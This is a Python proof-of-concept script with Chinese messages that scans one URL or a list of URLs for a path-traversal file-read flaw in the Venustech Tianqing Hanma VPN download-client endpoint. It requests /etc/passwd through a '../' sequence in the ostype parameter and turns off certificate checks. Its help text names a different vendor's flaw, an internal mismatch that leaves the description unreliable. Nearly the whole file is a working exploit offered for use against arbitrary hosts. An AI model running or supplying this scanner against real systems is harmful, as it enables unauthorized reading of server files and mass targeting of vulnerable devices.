#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import argparse
import time
import ssl
from urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class TlsAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = ssl.create_default_context()
        ctx.set_ciphers('ALL:@SECLEVEL=1')
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = ctx
        return super(TlsAdapter, self).init_poolmanager(*args, **kwargs)

def check_vulnerability(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'
    }

    file_read_url = f"{url.rstrip('/')}/vpn/user/download/client?ostype=../../../../../../../etc/passwd"

    session = requests.Session()
    session.mount('https://', TlsAdapter())

    try:
        response = session.get(file_read_url, headers=headers, verify=False, timeout=30)
        if response.status_code == 200 and "root" in response.text:
            print(f"{RED}URL [{url}] 存在启明星辰天青汉马VPN-download-client-任意文件读取漏洞{RESET}")
        else:
            print(f"URL [{url}] 可能不存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在用友NC UFIDA ELTextFile.load.d任意文件读取漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()